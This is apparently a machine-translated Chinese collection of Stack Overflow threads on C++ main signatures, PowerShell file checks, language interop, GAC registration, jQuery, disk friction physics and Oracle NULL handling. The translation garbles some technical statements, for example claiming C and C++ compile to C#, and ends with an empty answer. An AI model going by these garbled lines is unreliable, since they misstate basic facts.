## 回答 #1

> 赞同：76
> 
> 时间：2009-03-11T23:56:08.883

区别在于一个是正确的定义方式`main`，另一个不是。

是的，这很重要。任何一个

```
int main(int argc, char** argv) 
```

或者

```
int main() 
```

是您`main`根据 C++ 规范的正确定义。

`void main(int argc, char** argv)`

IIRC 不是并且曾经是旧 Microsoft 的 C++ 编译器附带的一种变态。

[https://isocpp.org/wiki/faq/newbie#main-returns-int](https://isocpp.org/wiki/faq/newbie#main-returns-int)

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2010-01-17T12:49:36.107

[Bjarne Stroustrup](https://en.wikipedia.org/wiki/Bjarne_Stroustrup)说得很清楚：

> 定义`void main()`不是，也从来不是 C++，甚至也不是 C。

请参阅[参考资料](http://www.stroustrup.com/bs_faq2.html#void-main)。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2009-03-11T23:57:28.490

你应该使用`int main`. C 和 C++ 标准都指定`main`应该返回一个值。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2009-03-11T23:56:50.647

对于 C++，只允许使用 int。对于 C，C99 表示只允许 int。先前的标准允许`void`退货。

简而言之，总是`int`。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2009-03-12T01:01:36.090

关键是，C 程序（和 C++ 相同）总是（应该？）返回成功值或错误代码，因此应该以这种方式声明它们。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-03-12T02:05:36.843

很久以前，我发现[这个页面 (void main(void))](http://users.aber.ac.uk/auj/voidmain.shtml)包含“标准说它无效”论点之外的许多原因。在特定的操作系统/架构上，它可能会导致堆栈损坏或发生其他令人讨厌的事情。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-03-12T00:04:06.650

如果您按照规范进行，那么您应该始终声明`main`返回一个`int`.

但实际上，大多数编译器都会让你摆脱其中任何一个，所以真正的区别在于你是否想要/需要向 shell 返回一个值。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2010-01-17T12:27:02.227

在 C++ 中，`main()`必须返回`int`. 但是，C99 允许`main()`具有非`int`返回类型。这是 C99 标准的摘录。

*5.1.2.2.1 程序启动*

*程序启动时调用的函数名为 main。实现没有声明这个函数的原型。它应定义为返回类型为 int 且不带参数：*

`int main(void) { /* ... */ }`

*或者带有两个参数（这里称为 argc 和 argv，尽管可以使用任何名称，因为它们是声明它们的函数的局部变量）：*

`int main(int argc, char *argv[]) { /* ... */ }`

*或同等学历; **或以其他一些实现定义的方式***。

另请注意，`void main()`尽管实际上 gcc 确实会编译，但它会`return 0;`在遇到右大括号时进行编译。

# ssis - 如何让混合 SSIS-J2EE 系统通过消息传递进行通信？

> ID：636831
> 
> 赞同：1
> 
> 时间：2009-03-11T23:54:31.633
> 
> 标签：ssis, cross-platform, msmq

我目前正在开发一个 ETL 解决方案，由于各种原因，它包括**SSIS**组件以及**J2EE**服务。

我需要各种组件通过消息队列进行异步通信。但是，明显的限制是 SSIS 仅与 MSMQ 集成，而在 Java 端使用 JMS 显然是有意义的。

我考虑过 MSMQ/MQSeries 桥（我们在内部使用 WebsphereMQ），但我觉得这给解决方案增加了另一层复杂性。

我现在想知道是否有更简单的解决方案来实现跨平台消息传递。消息传递方法的目的实际上是实现组件之间的控制传递，而不是传递数据。每个组件，无论是 SSIS 包还是 J2EE 服务，都将从同一个底层数据库读取/写入，所以我想知道是否最好只在任一侧实现轮询机制。欢迎提出建议。

克里斯托夫。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-17T01:32:43.430

根据您的需要，您可以编写自己的桥梁来在 MSMQ 和 WMQ 之间移动消息。使用 .NET 和 IBM XMS 库，我们已经非常轻松地完成了。

[http://www-01.ibm.com/support/docview.wss?rs=171&uid=swg24011756&loc=en_US&cs=utf-8&lang=en](http://www-01.ibm.com/support/docview.wss?rs=171&uid=swg24011756&loc=en_US&cs=utf-8&lang=en)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-12T00:28:18.213

您可以使用 ESB 代替 JMS，并使用 SSIS 中的 Web 服务任务通过 SOAP 与 ESB 进行连接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-12T06:29:18.487

如果您在 J2EE->SSIS 通道中只需要能够从 J2EE 启动 SSIS 包，我认为最简单的解决方案是配置运行此包的 SQL Server 代理作业，然后从 Java 调用 sp_startjob 存储过程 - 应该更容易，并且涉及的附加组件更少。

我不确定调用 SSIS->J2EE 的最佳方式是什么。

# powershell - 如何使用 Powershell 中的 FileInfo 对象

> ID：636838
> 
> 赞同：16
> 
> 时间：2009-03-11T23:57:01.503
> 
> 标签：powershell, system.io.fileinfo

我现在开始使用 PowerShell，并且在使用 Unix shell 很长时间后，我想知道如何检查文件或目录是否存在。

在 Powershell 中，为什么`Exist`在下面的表达式中返回 false？

```
PS H:\> ([System.IO.FileInfo]"C:\").Exists
False 
```

有没有比以下方法更好的方法来检查文件是否是目录：

```
PS H:\> ([System.IO.FileInfo]"C:\").Mode.StartsWith("d")
True 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2009-03-12T00:08:27.980

使用“测试路径”而不是 System.IO.FileInfo.Exists

```
PS C:\Users\m> test-path 'C:\'
True 
```

您可以使用 PSIContainer 来确定文件是否为目录：

```
PS C:\Users\m> (get-item 'c:\').PSIsContainer
True

PS C:\Users\m> (get-item 'c:\windows\system32\notepad.exe').PSIsContainer
False 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-03-12T00:12:18.627

除了[迈克尔的回答](https://stackoverflow.com/questions/636838/how-to-use-fileinfo-object-from-powershell/636864#636864)，您还可以使用以下方法进行测试：

```
PS H:> ([System.IO.DirectoryInfo]"C:\").Exists
True 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2009-03-12T20:07:32.363

> 在 Powershell 中，为什么 Exist 在以下表达式中返回 false？
> 
> ```
>   PS H:> ([System.IO.FileInfo]"C:\").Exists
>   
> ```

因为没有名为“C:\”的文件——它是一个目录。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2009-03-12T00:12:16.803

```
Help Test-Path

Test-Path Determines whether all elements of a path exist

Test-Path -PathType Leaf C:\test.txt
Test-Path -PathType Container C:\
Test-Path C:\ 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2017-05-04T02:56:19.103

这两个都评估为真

```
$(Get-Item "C:\").GetType() -eq [System.IO.DirectoryInfo]
$(Get-Item "C:\test.txt").GetType() -eq [System.IO.FileInfo] 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2011-08-29T20:01:15.493

您可以使用`Get-Item`允许 PowerShell 在 和 之间进行`FileInfo`选择`DirectoryInfo`。如果路径未解析到某个位置，它将引发异常。

```
PS> $(Get-Item "C:\").GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     DirectoryInfo                            System.IO.FileSystemInfo 
```

`Test-Path`如果您需要`DirectoryInfo`or`FileInfo`条目（如果它确实存在），我只会使用它。

# interop - 多个语言如何在一个项目中交互？

> ID：636841
> 
> 赞同：87
> 
> 时间：2009-03-11T23:57:29.553
> 
> 标签：interop, multiple-languages, language-interoperability

我听说有些人在一个项目中使用多种语言进行编程。我无法想象这些语言是如何相互作用的。

我的意思是没有像这样的Java方法

```
myProgram.callCfunction(parameters); 
```

永远不会发生还是我错了？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2009-03-12T00:07:44.567

在一个项目中使用多种语言实际上很常见，但背后的原则并不总是简单的。

在简单的情况下，不同的语言被编译成相同的代码。例如，C 和 C++ 代码通常被编译成机器汇编程序或 C#，而 VB.Net 被编译成 IL（.NET 运行时可以理解的语言）。

如果语言/编译器使用不同的类型系统，就会变得更加困难。可以有很多不同的方式，内部表示整数、浮点数和双精度等基本数据类型，表示字符串的方式甚至更多。在不同语言之间传递类型时，必须确保双方都解释相同的类型，或者 - 如果不是 - 类型被正确映射。这种类型映射也称为[编组](http://en.wikipedia.org/wiki/Marshalling_(computer_science))。

不同程序语言之间互操作性的经典示例是（主要来自 Windows 世界）：

*   .NET 平台可用的各种语言。这包括 C#、VB.Net、J#、IronRuby、F#、XSLT 和许多其他不太流行的语言。
*   用 C++ 或 VB 编写的本机 COM 组件可用于多种语言：VBScript、VB、所有 .NET 语言、Java
*   可以从 .NET 或 VB 调用 Win32 api 函数
*   IPC（进程间通信）
*   [Corba](https://en.wikipedia.org/wiki/Common_Object_Request_Broker_Architecture)，可能是最全面（也是最复杂）的方法
*   Web 服务和其他面向服务的架构，可能是最现代的方法

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2009-03-12T01:50:41.027

一般来说，任何大小合适的 Web 项目都将使用大约五种语言：HTML、CSS、Javascript、某种服务器端“完成任务”语言（ASP、JSP、带有 Perl、PHP 等的 CGI 脚本），以及一些变体用于数据库连接的 SQL。

（当然，这是对 HTML 和 CSS 是否算作编程语言的争论——我是“它们是，但不是图灵完备的语言”阵营，但那是另一个话题。 )

所有这些如何协同工作的一些示例：

如果你走的是最佳实践路线，网页的结构是 HTML，如何显示它的说明是 CSS——可以在同一个文件中，但不一定要在同一个文件中。CSS 包含一堆类，HTML 引用这些类，由浏览器决定如何将它们一起单击。

更进一步，该页面上的任何 javascript 脚本都可以更改存在的任何 HTML/CSS（更改 HTML 实体的内容，将一个 CSS 类替换为另一个，更改 CSS 的行为，等等。 ）它通过称为文档对象模型的东西来实现这一点，它本质上是一种语言和平台独立的 API，用于以类似对象的方式操作 HTML 页面（此时我将慢慢后退，只提供[相关的链接维基文章](http://en.wikipedia.org/wiki/Document_Object_Model)。）

但是，所有的 HTML/CSS/Javascript 是从哪里来的呢？这就是服务器端语言的作用。在最简单的形式中，服务器端语言是一个程序，它返回一个巨大的字符串，其中包含一个 HTML 页面作为其输出。显然，这可能会变得更加复杂：HTML 表单和查询字符串参数可以用作我们服务器端程序的输入，然后您就拥有了整个 AJAX 东西，其中 javascript 也可以直接将数据发送到服务器语言。您还可以想象服务器语言可以自定义输出的 HTML、CSS 和 Javascript 的地方——本质上，您有一个用一种语言编写的程序用另一种语言编写的程序。

服务器端语言到 SQL 连接的工作方式大致相同。有很多方法可以让它变得更复杂和更安全，但最简单的方法是让您的服务器语言动态构建一个包含 SQL 命令的字符串，通过某种连接器将其交给数据库，然后返回结果集。（在这种情况下，您确实拥有一个归结为 someValue = database.executeThisSQLCommand( SQLString ) 的函数。）

所以总结一下，在这种情况下，不同的语言要么通过彼此实际编写程序来进行通信，要么通过以每个人都能理解的非常简单、易于解析的格式传递数据。（主要是弦乐。）

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2009-03-12T00:03:57.273

使用的多种语言简称为“互操作性”或“互操作”。

你的例子是错误的。Java 可以调用 C 函数。

该语言提供了一种互操作性机制。

对于 .NET，语言被编译成 IL 作为 CLI 的一部分。因此，任何 .NET 语言都可以互操作（调用定义的方法）以任何其他 .NET 语言定义的模块。

举个例子：

我可以在 C# 中定义一个方法

```
static void Hello(){ Console.WriteLine("Hello World");} 
```

我可以从 Python (IronPython) 调用它

```
 Hello() 
```

并得到预期的输出。

一般来说，某些语言的互操作性比其他语言更好，特别是如果语言作者专门将互操作性作为语言的特性。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2009-03-12T04:51:21.750

多种语言可以交互：

1.  管道输入/输出（任何语言都可以做到这一点，因为输入和输出必须在每种非玩具语言中实现）
2.  将一种语言的代码编译为本机库，而另一种语言支持调用本机代码。
3.  通过环回网络连接进行通信。通过这种方式，您可能会遇到防火墙干扰的问题。
4.  数据库。这些可以被认为是一种“通用”数据存储格式，因此可以被大多数具有数据库扩展的语言访问。这通常需要一个程序完成操作，然后下一个程序才能访问数据库。此外，所有“通信”通常都写入磁盘。
5.  如果所涉及的语言在相同的运行时（即.NET、JVM）上运行，那么您通常可以将对象数据从一种语言直接传递到另一种语言而几乎没有阻碍。

几乎在每种情况下，您都必须将任何通信转换为通用格式，然后才能进行交换（同一运行时上的语言除外）。这就是为什么在一个项目中很少使用多种语言的原因。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2009-03-12T01:51:32.990

我从事一个大型企业项目，该项目由（最后一次统计）大约 8 种语言组成。大部分通信是通过企业级消息总线进行的，该总线包含多种语言的绑定，以接入和来回传递数据。它被称为[tibco](http://en.wikipedia.org/wiki/Tibco)。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-03-12T00:08:46.873

在一个项目中使用不同的语言有很多不同的方法。我想到了两个主要类别：

1.  一起使用不同的语言来构建一个应用程序。例如，使用 Java 构建 GUI 并使用 JNI 访问 C API（所以回答您的问题，您可以从 Java 调用 C 函数；））

2.  如果它们不是同一应用程序的一部分，则在一个项目中一起使用不同的语言。例如。我目前正在开发一个使用大量文本的 iPhone 应用程序。我目前使用三种语言：Python（用于处理文本的原始来源）、SQL（将 python 应用程序的结果以易于从 iPhone sqlite3 API 访问的格式放置）和 Objective C 来构建实际的应用程序。尽管最终产品只是Objective C，我还是使用了另外两种语言来获得最终产品。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-03-12T00:06:32.917

你可以有一个应用程序，其中大部分工作是用 Java 完成的，但可能有一部分工作，比如数据解析器或用 Python 编写的东西，或者你有什么。实际上几乎是两个独立的应用程序，也许解析器只是在文件上做一些工作，然后你的 Java 主应用程序正在使用它们做一些事情。如果有人问我在这个项目中使用了什么，我会说“Java 和 Python”。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2009-03-12T00:13:16.800

在一个项目中可以通过多种方式使用多种语言。一些例子：

*   您可以用 C 语言编写一个 DLL，然后从 VB 程序中使用该库。
*   你可以用 C++ 编写一个服务器程序，并且有很多不同的客户端语言实现。
*   一个 Web 项目经常使用多种语言；例如，一个用 Java（一种编程语言）编写的服务器程序，它使用 SQL（一种查询语言）从数据库中获取数据，然后以 HTML（一种标记语言）将结果发送到浏览器，用户可以使用 Javascript（一种脚本语言）进行交互...

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2009-03-12T00:14:28.623

很糟糕。如果没有紧急需要，坚持使用单一语言。您正在增加依赖性和复杂性。但是，当您拥有提供有趣功能的现有代码时，将它们粘合在一起比重新创建它更容易。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2009-03-12T00:02:18.137

这取决于项目的类型。如果您想进行实验，您可以在 .NET 中设置一个 Web 项目，并逐页更改语言。它不像您在伪代码中显示的那样工作，但它是多种语言。当然，实际的代码目录必须是单一语言。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2009-03-12T00:09:09.273

语言中的代码可以通过多种方式直接交互。只要在代码之间传递的数据格式正确，在位和字节级别，那么不同语言就没有理由不能互操作。这种方法用于传统的 windows DLL 开发。即使在不同的平台上，如果您可以获得正确的格式（如果有兴趣，请查看大/小端），只要您的链接器（而不是编译器）知道如何将代码连接在一起，它就可以工作。

除此之外，还有许多其他语言可以相互交谈的方式。在 .Net 世界中，代码被编译为 IL 代码，这对于每种语言都是相同的，这样 C#、VB.Net 在底层都是相同的，并且可以无缝地相互调用/工作。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-03-12T01:07:47.217

只是添加到示例列表中，在 C 或 C++ 中优化 Python 代码或编写 C 库以将另一个库绑定到 Python 是相当常见的。

# windows - 在没有程序集清单的 GAC 中注册 DLL

> ID：636850
> 
> 赞同：5
> 
> 时间：2009-03-12T00:03:18.430
> 
> 标签：windows, visual-studio-2010, gacutil

我有一个想要在 GAC 注册的 DLL。我输入命令：

```
gacutil /i c:\temp\msvcr100.dll 
```

我得到了错误：

```
将程序集添加到缓存失败：该模块应包含 as
集显。
```

我只有DLL。有没有办法创建/伪造/绕过它？

对于那些感兴趣的人，我正在尝试从 VHD 中提取 Visual Studio 2010 和 .NET 4.0 CTP 并在我的物理机上运行它。作为旁注，是否尝试过此操作？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-12T08:41:27.797

这实际上是一个支持 GAC 的 DLL 吗？看起来不像。也许它只是可调节的？为什么要GAC呢？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-19T21:23:57.173

“对于那些感兴趣的人，我正在尝试从 VHD 中提取 Visual Studio 2010 和 .NET 4.0 CTP 并在我的物理机上运行它。作为旁注，这是否尝试过？”

仅供参考 - 此时有一个完整的 Beta 1 映像，如果需要，您可以下载并在桌面上合法运行。

[MSDN 上的 VS 2010 beta 1](http://www.vistadb.net/blog/post/2009/05/17/visual-studio-2010-beta-1.aspx)

不过，它目前仅适用于 MSDN 订阅者。稍后将添加到 Microsoft 下载中。

编辑：现在开放供所有人下载

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2011-08-09T09:22:55.923

我经历过（显然）损坏的dll（我假设来自USB驱动器的副本失败）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-12T00:10:52.953

我想当您拖放到 C:\Windows\assembly 时会完成相同的过程？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-15T17:00:21.547

您确定“从 VHD 中提取 [ing] Visual Studio 2010 和 .NET 4.0 CTP”不违反许可协议吗？如果微软希望你“在我的物理机器上运行它 [VS2010]”，他们只会将它作为 noraml 安装提供。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-12T00:09:52.610

如果您可以创建清单（我不确定清单应该是什么样子），只需将 DLL 加载到 Visual Studio 的资源编辑器（文件->打开->文件->[选择 dll]->[单击向下）就很容易了打开按钮上的 chevron]-> 资源视图），只需将清单添加到 dll 中。

# apache-flex - 用数组填充（...rest）参数？

> ID：636853
> 
> 赞同：9
> 
> 时间：2009-03-12T00:04:37.490
> 
> 标签：apache-flex, flash, actionscript-3, actionscript

一些 as3 函数通过使用约定允许任意数量的参数来处理重载：

```
public function doSomething( ... rest ):void; 
```

我处于需要将数组（任意长度）的所有值传递给这种类型的函数的情况......我不知道该怎么做。建议？

这是一个 hack 解决方案，但它不可扩展：

```
switch (args.length) {
case 0: doSomething(); break;
case 1: doSomething(args[0]); break;
case 2: doSomething(args[0], args[1]); break;} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-03-12T00:07:26.517

查看[Function#Apply()](http://livedocs.adobe.com/flash/9.0/ActionScriptLangRefV3/Function.html#apply())。它允许您将参数作为数组传递。

```
doSomething.apply(contextObj, args); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-11T08:03:07.467

[这](http://johncblandii.com/2010/06/as3-tip-pass-rest-arguments-w-other-arguments-to-a-function.html)是在函数之间传递剩余参数的一个非常好的技巧。

# javascript - 为什么没有找到元素时函数会运行？

> ID：636867
> 
> 赞同：1
> 
> 时间：2009-03-12T00:08:58.387
> 
> 标签：javascript, jquery, function, jquery-ui, jquery-ui-datepicker

我有以下代码，但是如果`input.formdate`找不到，它仍然会运行该`getDateFormat`函数。这对我来说没有意义。

有谁知道原因？

```
$(function() {
    $("input.formdate").datepicker({
        changeMonth: true,
        changeYear: true,
        dateFormat: getDateFormat()
    });
});

function getDateFormat()
{
    var format = 'DMY';

    if (document.edit_form && document.edit_form.date_format)
        format = document.edit_form.date_format.value;

    if (format = "DMY")
        return "dd-mm-yy";
    else
        return "mm-dd-yy";
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-12T00:12:47.893

***旧答案：（***
*基于对问题的误解 - 请参阅评论）*
因为您正在调用函数并传递其结果，而不是您应该做的事情：传递对函数的引用（即将其视为变量）。

做这个：

```
$(function() {
    $("input.formdate").datepicker({
        changeMonth: true,
        changeYear: true,
        dateFormat: getDateFormat
    });
}); 
```

* * *

***更新：***
检查 jQuery UI DatePicker API 后，您需要将字符串传递给 dateFormat。
如果您不希望您的函数执行，除非至少有一个输入具有一类 formdate，您需要这样做：

```
if ( $('input.formdate').length > 0 )
{
    $("input.formdate").datepicker
    (
        { changeMonth: true
        , changeYear: true
        , dateFormat: getDateFormat()
        }
    );
} 
```

或者，如果：

```
$("input.formdate").datepicker
(
    { changeMonth: true
    , changeYear: true
    , dateFormat:
        $('input.formdate').length > 0 ? getDateFormat() : 'dd-mm-yy'
    }
); 
```

尽管这是否或多或少具有可读性是值得商榷的。

（可能还有比这更短的方法，但我现在必须走了。）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-12T00:13:00.403

getDateFormat 函数在 Javascript 被解析后立即运行，因为它在对象文字符号中。

您的表达式被评估为

```
$(function() {
    $("input.formdate").datepicker({
        changeMonth: true,
        changeYear: true,
        dateFormat: <RESULT_FROM_CALLING_getDateFormat()>
    });
}); 
```

# simulation - 如何计算二维表面上移动和旋转磁盘的摩擦阻力？

> ID：636874
> 
> 赞同：5
> 
> 时间：2009-03-12T00:11:37.710
> 
> 标签：simulation, physics

让我们考虑一个质量为 m 且半径为 R 的圆盘，其表面上还涉及摩擦力 u。当我们给这个圆盘一个方向上的起始速度 v 时，圆盘将朝那个方向移动并减速并停止。

如果圆盘在速度旁边有一个旋转（或旋转线垂直于表面旋转）w，那么圆盘不会在一条线上移动，而是弯曲。最后，线速度和角速度都将为 0。

如何计算这种条带/弯曲/拖动？是否可以为 X(v,w,t) 函数提供解析解，其中 X 将根据给定 t 处的初始 vw 给出磁盘的位置？

任何模拟提示也可以。我想，根据 w 和 m 以及 u，会有一个垂直于线速度的附加速度，因此磁盘的路径会从线性路径弯曲。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-12T01:54:31.470

如果您要对此进行模拟，我可能会建议将磁盘和桌子之间的接触面划分为径向网格。计算每个时间步长网格上每个点的相对速度和力，然后将力和扭矩（r 交叉 F）相加，得到整个圆盘上的净力 F 和净扭矩 T。然后，您可以应用方程 F=(m)(dv/dt) 和 T=(I)(dw/dt) 来确定下一个时间步的 v 和 w 的微分变化。

就其价值而言，我认为扁平圆盘不会在摩擦力（与速度无关）或阻力（与速度成线性比例）的影响下弯曲。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-12T01:39:38.247

球会随着自旋沿大弧线移动，但 2D 表面上的 [均匀] 圆盘不会。

对于圆盘来说，它的自旋中心与它的重心相同，因此没有施加扭矩。（正如 duffymo 所提到的，一个不均匀的圆盘会施加一个扭矩。）

对于一个均匀的球，如果旋转的轴不垂直于桌面，这会导致球经历一个旋转扭矩，从而使其以轻微的弧度移动。圆弧半径大，力矩小，通常摩擦使球很快停止。

如果有横向速度，球会沿着抛物线运动，就像一个落下的物体。扭矩分量（和圆弧的半径）可以按照与进动顶部相同的方式计算。只是球位于顶部的尖端（错误....）而底部是“虚构的”。

顶方程：[http ://hyperphysics.phy-astr.gsu.edu/HBASE/top.html](http://hyperphysics.phy-astr.gsu.edu/HBASE/top.html)

`omega_p = mgr/I/omega`

在哪里

```
omega_p = rotational velocity...dependent on how quickly you want friction to slow the ball
m = ball mass
g = 9.8 m/s^2 (constant)
r = distance from c.g. (center of ball) to center, depends on angle of spin axis (solve for this)
omega = spin rate of ball
I = rotational inertia of a sphere 
```

我的 2 美分。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-12T00:34:39.480

我推荐牛顿运动定律的数值积分。画出圆盘的自由体图，给出系统的初始条件，并将加速度和速度方程及时积分。您有三个自由度：平面中的 x、y 平移和垂直于平面的旋转。因此，您需要同时求解六个 ODE：线速度和角速度的变化率、两个位置的变化率以及角旋转的变化率。

请注意：摩擦和接触会使圆盘和工作台之间的边界条件变为非线性。这不是一个小问题。

通过将圆盘视为点质量可以进行一些简化。我建议您查看凯恩的[动力学](https://rads.stackoverflow.com/amzn/click/com/0070378460)，以便更好地理解物理学以及如何最好地阐述问题。

我想知道您想象的路径弯曲是否会发生在完美平衡的磁盘上。我还没有解决，所以我不确定。但是如果你拿一个完美平衡的圆盘并围绕它的中心旋转它，没有不平衡就没有平移，因为没有净力使它平移。在给定方向上添加初始速度不会改变这一点。

但是，如果磁盘不平衡，很容易看到会导致磁盘偏离直线路径的力。如果我是正确的，您必须在磁盘上添加不平衡才能看到直线弯曲。也许比我更优秀的物理学家可以参与进来。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-12T02:10:50.653

当你说摩擦你时，我不确定你的意思。通常有一个摩擦系数C，使得滑动物体的摩擦力F=C*接触力。

圆盘被建模为由围绕中心排列成圆形的一些点组成的单个对象。
为简单起见，您可以将圆盘建模为均匀填充点的六边形，以确保每个点代表相等的面积。

每个点的权重 w 是它所代表的磁盘部分的权重。
它的速度矢量很容易从磁盘的速度和旋转速率计算出来。
该点的阻力是减去它的重量乘以摩擦系数，乘以它的速度方向上的单位矢量。

如果一个点的速度变为零，它的阻力矢量也为零。
您可能需要使用大约为零的容差，否则它可能会一直抖动。

要获得磁盘上的总减速力，请将这些阻力矢量相加。

要获得角减速力矩，请将每个阻力矢量转换为围绕圆盘中心的角力矩，并将它们相加。

考虑到圆盘的质量和角惯性，这应该会产生线性和角加速度。

为了整合运动方程，请确保您的求解器可以处理突然的转换，例如磁盘停止时。
一个具有非常精细步长的简单欧拉求解器可能就足够了。

# sql - SQL 不等于 & 空

> ID：636886
> 
> 赞同：9
> 
> 时间：2009-03-12T00:14:02.210
> 
> 标签：sql, performance, oracle

我们想写这个查询：

```
select * from table 
where col1 != 'blah' and col2 = 'something' 
```

我们希望查询包含 col1 为空的行（并且 col2 = 'something'）。目前，查询不会对 col1 为空的行执行此操作。下面的查询是最好和最快的方法吗？

```
select * from table 
where (col1 != 'blah' or col1 is null) and col2 = 'something' 
```

或者，如果需要，我们可以将所有 col1 空值更新为空字符串。这会是更好的方法吗？然后我们的第一个查询就可以工作了。

* * *

**更新**：回复：使用 NVL：我在另一篇文章中读到，[从](https://stackoverflow.com/questions/191640/get-null-null-in-sql)性能的角度来看，这不是一个很好的选择。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-03-12T00:20:46.703

在 Oracle 中，空字符串和 NULL 没有区别。

这是对 SQL 标准的公然无视，但是你去...

除此之外，您不能使用“普通”运算符与 NULL（或非 NULL）进行比较：“col1 = null”不起作用，“col1 = ''”不起作用，“col1 != null”不起作用，您必须使用“为空”。

因此，不，您不能以任何其他方式使这项工作，然后是“col 1 为空”或对此的一些变体（例如使用 nvl）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-12T00:42:58.990

我认为您发布的解决方案是最佳选择之一。

关于性能，我认为在这种情况下差别不大，如果子句已经有 != 比较，通常优化器不会在该列中使用索引，因为选择性不够，所以区分度更高过滤器将是“和”条件的另一侧。

如果你问我，我不会使用空字符串作为 null，但可能只是个人喜好。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-03T20:03:16.333

虽然不是最易读的——Oracle 有一个[LNNVL 函数](http://www.techonthenet.com/oracle/functions/lnnvl.php)，它本质上是 not() 函数，但会反转空值的行为。这意味着将 lnnvl 内部的任何内容与 null 进行比较将返回 true（我不知道这可能对性能产生什么影响）。

要在单个语句中执行您想要的操作：

```
select * from table where lnnvl(col1 = 'blah') and col2 = 'something' 
```

请注意，这仅适用于将可空值与您可以确保不可为空的值进行比较。否则，您需要按照 Thilo 的建议进行操作 - 使用类似于

```
lnnvl(nvl(col1, -1) = nvl(col2, -1)) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-12T02:31:28.683

这取决于您的数据，但大多数优化器会在 col1 之前查看 col2，因为 = 比 != 更容易索引。

否则，有多种方法可以加快此查询的速度。最好这样做（col1 != 'blah' 或 col1 为空），但某些数据库允许您索引函数。因此，您可以索引 coalesce(col1, 0) 并获得良好的性能。

实际上，这取决于您的数据和表格。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-12T00:23:02.657

在 oracle 中使用 nvl 函数

```
select * from table where nvl(col1,'notblah') <> 'blah' 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-08T05:10:47.107

如果您想加快此类查询，并且您使用的是 Oracle 10g 或更高版本，请使用基于函数的索引将这些 NULL 转换为值：

```
CREATE INDEX query_specific_index ON table (col2, NVL(col1,'***NULL***'));

select * from table 
where NVL(col1,'***NULL***') != 'blah' and col2 = 'something'; 
```

在这种情况下，数据库很可能会使用索引（当然，受制于 CBO 的决定，受行数和统计数据准确性的影响）。查询必须使用索引中给出的确切表达式 - 在这种情况下，“ `NVL(col1,'***NULL***')`”

当然，选择一个`'***NULL***'`不会与 col1 中的任何数据冲突的值！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-25T18:34:01.313

这个选项怎么样。我认为如果您的值从不为空，它可能会起作用。

```
where not (value = column) 
```

这将导致以下真值表用于评估 where 子句

```
 col1
              | 'bla' |  null |
              -----------------
      | 'bla' |   F   |   T   |
value -------------------------
      |  null |   T   |  *T   | 
```

*这是唯一一个“错误”的，但没关系，因为我们的值永远不会为空

## 更新

好的，我刚刚尝试了我的想法，但失败了。我将把答案留在这里，以节省其他人尝试同样事情的时间。这是我的结果：

```
select 'x', 'x' from dual where not ('x' = 'x');
0 rows
select 'x', 'y' from dual where not ('x' = 'y');
1 row
select 'x', 'null' from dual where not ('x' = null);
0 rows
select 'null', 'null' from dual where not (null = null);
0 rows 
```

## 更新 2

如果您的值从不为空（与上面的真值表匹配），则此解决方案有效

```
where ('blah' != col1 or col1 is null) 
```

在这里测试：

```
select 'x', 'x' from dual where ('x' != 'x' or 'x' is null);
0 rows
select 'x', 'y' from dual where ('x' != 'y' or 'y' is null);
1 row
select 'x', 'null' from dual where ('x' != null or null is null);
1 row
select 'null', 'null' from dual where (null != null or null is null);
1 row 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2009-03-12T00:22:34.517

对于甲骨文

```
select * from table where nvl(col1, 'value') != 'blah' and col2 = 'something' 
```

对于 SqlServer

```
select * from table where IsNull(col1, '') <> 'blah' and col2 = 'something' 
```

* * *

## 回答 #9

> 赞同：-3
> 
> 时间：2009-03-12T00:17:26.633

